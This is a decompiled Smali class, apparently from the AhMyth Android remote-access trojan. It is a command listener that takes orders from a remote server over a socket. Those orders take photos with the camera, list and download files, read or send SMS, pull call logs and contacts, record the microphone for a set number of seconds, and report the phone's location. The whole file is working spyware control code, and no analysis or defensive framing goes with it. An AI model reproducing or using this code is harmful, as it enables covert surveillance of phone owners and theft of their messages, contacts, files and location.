.class final Lahmyth/mine/king/ahmyth/ConnectionManager$2;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 66
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 7
    .param p1, "args"    # [Ljava/lang/Object;

    .prologue
    const/4 v4, -0x1

    const/4 v5, 0x1

    const/4 v3, 0x0

    .line 70
    const/4 v6, 0x0

    :try_start_0
    aget-object v0, p1, v6

    check-cast v0, Lorg/json/JSONObject;

    .line 71
    .local v0, "data":Lorg/json/JSONObject;
    const-string v6, "order"

    invoke-virtual {v0, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 72
    .local v2, "order":Ljava/lang/String;
    const-string v6, "order"

    invoke-static {v6, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v6

    sparse-switch v6, :sswitch_data_0

    :cond_0
    move v3, v4

    :goto_0
    packed-switch v3, :pswitch_data_0

    .line 115
    .end local v0    # "data":Lorg/json/JSONObject;
    .end local v2    # "order":Ljava/lang/String;
    :cond_1
    :goto_1
    return-void

    .line 73
    .restart local v0    # "data":Lorg/json/JSONObject;
    .restart local v2    # "order":Ljava/lang/String;
    :sswitch_0
    const-string v5, "x0000ca"

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    goto :goto_0

    :sswitch_1
    const-string v3, "x0000fm"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    move v3, v5

    goto :goto_0

    :sswitch_2
    const-string v3, "x0000sm"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x2

    goto :goto_0

    :sswitch_3
    const-string v3, "x0000cl"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x3

    goto :goto_0

    :sswitch_4
    const-string v3, "x0000cn"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x4

    goto :goto_0

    :sswitch_5
    const-string v3, "x0000mc"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x5

    goto :goto_0

    :sswitch_6
    const-string v3, "x0000lm"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x6

    goto :goto_0

    .line 75
    :pswitch_0
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "camList"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 76
    const/4 v3, -0x1

    invoke-static {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000ca(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 112
    .end local v0    # "data":Lorg/json/JSONObject;
    .end local v2    # "order":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 113
    .local v1, "e":Ljava/lang/Exception;
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 77
    .end local v1    # "e":Ljava/lang/Exception;
    .restart local v0    # "data":Lorg/json/JSONObject;
    .restart local v2    # "order":Ljava/lang/String;
    :cond_2
    :try_start_1
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "1"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 78
    const/4 v3, 0x1

    invoke-static {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000ca(I)V

    goto :goto_1

    .line 79
    :cond_3
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "0"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 80
    const/4 v3, 0x0

    invoke-static {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000ca(I)V

    goto/16 :goto_1

    .line 83
    :pswitch_1
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "ls"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 84
    const/4 v3, 0x0

    const-string v4, "path"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000fm(ILjava/lang/String;)V

    goto/16 :goto_1

    .line 85
    :cond_4
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "dl"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 86
    const/4 v3, 0x1

    const-string v4, "path"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000fm(ILjava/lang/String;)V

    goto/16 :goto_1

    .line 89
    :pswitch_2
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "ls"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 90
    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {v3, v4, v5}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000sm(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 91
    :cond_5
    const-string v3, "extra"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "sendSMS"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 92
    const/4 v3, 0x1

    const-string v4, "to"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "sms"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v3, v4, v5}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000sm(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 95
    :pswitch_3
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000cl()V

    goto/16 :goto_1

    .line 98
    :pswitch_4
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000cn()V

    goto/16 :goto_1

    .line 101
    :pswitch_5
    const-string v3, "sec"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v3

    invoke-static {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000mc(I)V

    goto/16 :goto_1

    .line 104
    :pswitch_6
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->x0000lm()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_1

    .line 73
    nop

    :sswitch_data_0
    .sparse-switch
        0x208f5ed6 -> :sswitch_0
        0x208f5ee1 -> :sswitch_3
        0x208f5ee3 -> :sswitch_4
        0x208f5f3f -> :sswitch_1
        0x208f5ff9 -> :sswitch_6
        0x208f600e -> :sswitch_5
        0x208f60d2 -> :sswitch_2
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
    .end packed-switch
.end method
